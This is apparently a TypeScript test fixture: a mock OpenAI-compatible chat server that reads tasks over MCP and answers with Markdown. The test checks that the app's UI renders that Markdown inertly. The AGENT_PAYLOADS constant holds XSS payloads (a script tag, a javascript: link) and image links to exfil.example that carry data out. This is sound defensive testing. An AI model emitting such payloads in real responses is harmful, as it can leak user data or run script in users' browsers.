import http from 'node:http';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';

export interface MockAgentOptions {
  apiKey: string;
  model: string;
  /** Life Hub MCP endpoint as seen from this process. */
  mcpUrl: string;
  mcpToken: string;
}

export interface RecordedTurn {
  authorization: string | undefined;
  model: string;
  messages: { role: string; content: string }[];
  mcp: { tools: string[]; openTasks: string[]; feedItems: string[] } | { error: string };
}

/** Payloads the UI must render inertly. */
export const AGENT_PAYLOADS = [
  '<script>window.__xss = 4</script>',
  '<img src="https://exfil.example/raw.png">',
  '![leak](https://exfil.example/leak.png?d=secret)',
  '[gefährlicher Link](javascript:window.__xss=5)',
  '[Sicherer Link](https://example.com/info)',
].join('\n\n');

async function readMcp(options: MockAgentOptions): Promise<RecordedTurn['mcp']> {
  const client = new Client({ name: 'mock-agent', version: '1.0.0' });
  try {
    await client.connect(
      new StreamableHTTPClientTransport(new URL(options.mcpUrl), {
        requestInit: { headers: { Authorization: `Bearer ${options.mcpToken}` } },
      }),
    );
    const tools = (await client.listTools()).tools.map((tool) => tool.name);
    const tasks = await client.callTool({ name: 'list_tasks', arguments: { status: 'open', limit: 20 } });
    const items = await client.callTool({ name: 'list_feed_items', arguments: { limit: 5 } });
    const text = (result: unknown) => JSON.parse((result as { content: { text: string }[] }).content[0]!.text);
    return {
      tools,
      openTasks: (text(tasks).items as { title: string }[]).map((task) => task.title),
      feedItems: (text(items).items as { title: string }[]).map((item) => item.title),
    };
  } catch (error) {
    return { error: String(error) };
  } finally {
    await client.close().catch(() => {});
  }
}

export interface MockAgentMode {
  /** `sse` streams OpenAI deltas, `json` ignores `stream: true` (fallback test), `fail-mid-stream` drops after chunk 1. */
  mode: 'sse' | 'json' | 'fail-mid-stream';
  /** When true in `sse` mode, pauses after the first streamed chunk until `release()` is called. */
  hold: boolean;
}

/**
 * OpenAI-compatible mock (`/v1/models`, `/v1/chat/completions`). Each turn reads
 * live data from Life Hub's MCP endpoint and answers with Markdown that contains
 * XSS and exfiltration payloads.
 */
export function createMockAgent(options: MockAgentOptions) {
  const turns: RecordedTurn[] = [];
  let config: MockAgentMode = { mode: 'sse', hold: false };
  let waiters: (() => void)[] = [];

  const release = () => {
    const pending = waiters;
    waiters = [];
    for (const resolve of pending) resolve();
  };

  const setMode = (patch: Partial<MockAgentMode>) => {
    config = { ...config, ...patch };
    if (!config.hold) release();
  };

  const waitIfHeld = () =>
    config.hold ? new Promise<void>((resolve) => waiters.push(resolve)) : Promise.resolve();

  const server = http.createServer((req, res) => {
    void (async () => {
      const url = new URL(req.url ?? '/', 'http://agent.invalid');
      const json = (status: number, body: unknown) => {
        res.writeHead(status, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(body));
      };
      if (url.pathname === '/__mock/turns') return json(200, turns);
      if (req.headers.authorization !== `Bearer ${options.apiKey}`) return json(401, { error: { message: 'bad key' } });
      if (url.pathname === '/v1/models') return json(200, { object: 'list', data: [{ id: options.model, object: 'model' }] });
      if (url.pathname !== '/v1/chat/completions' || req.method !== 'POST') return json(404, { error: { message: 'not found' } });

      let body = '';
      for await (const chunk of req) body += chunk;
      const request = JSON.parse(body) as { model: string; messages: { role: string; content: string }[]; stream?: boolean };
      const mcp = await readMcp(options);
      turns.push({ authorization: req.headers.authorization, model: request.model, messages: request.messages, mcp });
      const last = request.messages.at(-1)?.content ?? '';
      const summary =
        'error' in mcp
          ? `MCP-Fehler: ${mcp.error}`
          : `Ich habe über MCP ${mcp.openTasks.length} offene Aufgaben gelesen: ${mcp.openTasks.slice(0, 5).join(', ') || 'keine'}.`;
      // «Lange Antwort» asks for a reply longer than the screen (scroll behaviour test).
      const filler = last.includes('Lange Antwort')
        ? Array.from({ length: 40 }, (_, i) => `\n\nAbsatz ${i + 1} der langen Antwort.`).join('')
        : '';
      const parts = [
        `**Antwort vom Test-Agenten.** ${summary}\n\n`,
        `Deine Nachricht beginnt mit: «${last.slice(0, 60)}»\n\n`,
        AGENT_PAYLOADS + filler,
      ];
      const content = parts.join('');
      const id = `chatcmpl-${turns.length}`;

      if (!request.stream || config.mode === 'json') {
        return json(200, {
          id,
          object: 'chat.completion',
          model: request.model,
          choices: [{ index: 0, finish_reason: 'stop', message: { role: 'assistant', content } }],
        });
      }

      res.writeHead(200, {
        'Content-Type': 'text/event-stream; charset=utf-8',
        'Cache-Control': 'no-cache',
        Connection: 'keep-alive',
      });
      res.flushHeaders();
      const sendChunk = (delta: Record<string, unknown>, finishReason: string | null = null) => {
        res.write(
          `data: ${JSON.stringify({ id, object: 'chat.completion.chunk', model: request.model, choices: [{ index: 0, delta, finish_reason: finishReason }] })}\n\n`,
        );
      };

      sendChunk({ role: 'assistant', content: parts[0] });
      if (config.mode === 'fail-mid-stream') {
        await new Promise((resolve) => setTimeout(resolve, 20));
        res.destroy();
        return;
      }
      await waitIfHeld();
      sendChunk({ content: parts[1] });
      sendChunk({ content: parts[2] }, 'stop');
      res.write('data: [DONE]\n\n');
      res.end();
    })();
  });
  return { server, turns, setMode, release };
}
